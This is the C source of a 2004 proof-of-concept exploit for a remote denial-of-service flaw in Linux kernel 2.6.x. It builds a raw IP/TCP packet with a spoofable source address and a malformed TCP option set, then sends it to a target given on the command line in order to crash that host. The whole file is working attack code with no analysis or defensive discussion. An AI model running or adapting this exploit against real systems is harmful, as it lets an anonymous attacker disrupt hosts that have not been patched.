/*
  Remote DoS vulnerability in Linux kernel 2.6.x
  http://www.securityfocus.com/arhive/1/367615
  
  Date: 06.07.2004
  
  m00.0x333.org / rash

*/

#include <sys/types.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdio.h>

#define IPLEN sizeof(struct iphdr) 
#define TCPLEN sizeof(struct tcphdr)+8  
#define PACKLEN sizeof(struct iphdr)+sizeof(struct tcphdr)+8

unsigned short in_cksum(unsigned short *addr, int len)
{
  register int sum    = 0;
  u_short answer      = 0;
  register u_short *w = addr;
  register int nleft  = len;
  
  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }
  
  if (nleft == 1) {
    *(u_char *)(&answer) = *(u_char *)w;
    sum += answer;
  }
  
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return(answer);
}


int main(int argc, char *argv[])
{
 char *packet;
 struct iphdr *ip;
 struct tcphdr *tcp;
 unsigned char *raw_;
 int i;
 struct pseudohdr {
    unsigned long  saddr;
    unsigned long  daddr;
    unsigned char  reserved;
    unsigned char  proto;
    unsigned short len;
 } pseudohdr;
 char *pseudo;
 int sock, on =1;
 struct sockaddr_in remote;
 unsigned char fuck_opt[8] = {02, 04, 05, 0xB4, 01, 01, 04, 0xFD};
 
 if (argc != 5) {
   fprintf(stderr, "usage: %s <src_ip> <src_port> <dst_ip> <dst_port>\n", argv[0]);           
   exit(0);
 }
 
 /* creating raw socket */
 if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < -1) {
   perror("in socket()");
   exit(1);
 }
 
 /* set IP_HDRINCL options */
 if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL,(char *)&on, sizeof(on)) < 0) {
   perror("in setsockopt()");
   exit(1);
 }
 
 /* allocate memory, set pointers on buffer, zero buf */
 if ((ip = (struct iphdr *) malloc(IPLEN)) == NULL) {
    perror("in malloc for ip");
    exit(1);
 } 
 if ((tcp = (struct tcphdr *) malloc(TCPLEN)) == NULL) {
    perror("in malloc for tcp");
    exit(1);
 }
 if ((packet = (char *)malloc(PACKLEN)) == NULL) {
    perror("in malloc for packet");
    exit(1);
 }
  
 ip = (struct iphdr *) packet;
 tcp = (struct tcphdr *) (packet + IPLEN);
 memset((char *)packet, '\0', PACKLEN);
  
 //IP packet
 ip->version  = 4;
 ip->ihl      = 5;
 ip->tot_len  = htons(PACKLEN);
 ip->id       = 13;
 ip->ttl      = 255; 
 ip->protocol = IPPROTO_TCP;
 ip->saddr    = inet_addr(argv[1]);
 ip->daddr    = inet_addr(argv[3]);
 ip->check    = in_cksum((unsigned short *) ip, IPLEN);
 
 //TCP packet
 tcp->source  = htons(atoi(argv[2]));
 tcp->dest    = htons(atoi(argv[4]));
 tcp->seq     = 286261248;  //0x11100000  -  m00000  =)
 tcp->ack_seq = htonl(286261248); //htonl(m0000) 8)
 tcp->doff    = 7;
 tcp->window  = htons(0x0FA0);
 raw_ = (unsigned char *)tcp;
 (raw_)+=20;
 
 //set tcp options
 for (i=0; i<8; i++)
  memset((raw_)++, fuck_opt[i], 1);
 
 //Pseudo header
 pseudohdr.saddr    = ip->saddr;
 pseudohdr.daddr    = ip->daddr;
 pseudohdr.reserved = 0;
 pseudohdr.proto    = ip->protocol;
 pseudohdr.len      = htons(TCPLEN);

 //Allocation memory for pseudo packet
 if ((pseudo = (char *) malloc(sizeof(struct pseudohdr)+TCPLEN)) == NULL) {
   perror("in malloc for pseudo");
   exit(1);
 }
 
 //Copy data in pseudo packet, calculate checksum, free memory
 memcpy(pseudo, &pseudohdr, sizeof(struct pseudohdr));
 memcpy((pseudo + sizeof(struct pseudohdr)), tcp, TCPLEN);
 tcp->check = in_cksum((unsigned short *)pseudo,(sizeof(struct pseudohdr)+TCPLEN)); 
 free(pseudo);
 
 //Set values in sockaddr_in structure
 remote.sin_family = AF_INET;
 remote.sin_addr.s_addr = ip->daddr;
 remote.sin_port   = tcp->dest;

 //All ready. Send it..
 if (sendto(sock, packet, PACKLEN, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr)) < 0) {
    perror("in sendto");
    exit(1);
 }
}
